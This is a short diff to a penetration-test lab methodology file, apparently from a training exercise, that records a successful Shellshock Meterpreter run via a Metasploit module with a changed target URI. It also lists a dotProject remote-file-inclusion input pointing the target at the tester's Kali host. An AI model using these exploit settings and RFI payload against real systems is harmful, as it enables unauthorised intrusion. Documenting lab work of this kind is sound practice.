@@ -20,7 +20,7 @@
 ## Phase 2 — Validated access (pick order by time-box)
 
 - **RFI:** **`searchsploit dotproject 2.1.6`** → **EDB-22708**; **`gantt.php`** + **`dPconfig[root_dir]=http://<KALI>:8080/...`** → body reflects **`PROOF`** (**`102-004`** in [`../Screenshots/`](../Screenshots/)).
-- **Shellshock (Meterpreter):** **`exploit/multi/http/apache_mod_cgi_bash_env_exec`** — a **`check`** on **`/cgi-bin/printenv`** may still say **not vulnerable**; **`run`** can succeed when **`TARGETURI`** hits a **real `mod_cgi`** script. Capture **`LHOST`** / handler port and post-ex (**`sysinfo`**, **`getuid`**, **`shell`**) — evidence **`102-009`**.
+- **Shellshock (Meterpreter):** **`exploit/multi/http/apache_mod_cgi_bash_env_exec`** — a **`check`** on **`/cgi-bin/printenv`** may still say **not vulnerable**; **`run`** succeeded here with **`set targeturi /cgi-bin/test-cgi`**. Capture **`LHOST`** / handler port and post-ex — evidence **`102-011`**, **`102-012`**, **`102-009`**.
 
 ## Phase 3 — Generic catalogue (time-box)
 
@@ -33,7 +33,7 @@
 
 ## Phase 5 — Reporting
 
-- Chain **EDB-22708** → **`102-004`**, ZAP **`102-005`**, **Shellshock Meterpreter** **`102-009`**, and **`local.txt`** **`102-010`** for the narrative; archive dead ends under [unfruitful log](../unfruitful_attempts/README.md).
+- Chain **EDB-22708** → **`102-004`**, ZAP **`102-005`**, **Shellshock** **`102-011` / `102-012` / `102-009`**, and **`local.txt`** **`102-010`** for the narrative; archive dead ends under [unfruitful log](../unfruitful_attempts/README.md).
 
 ---
 
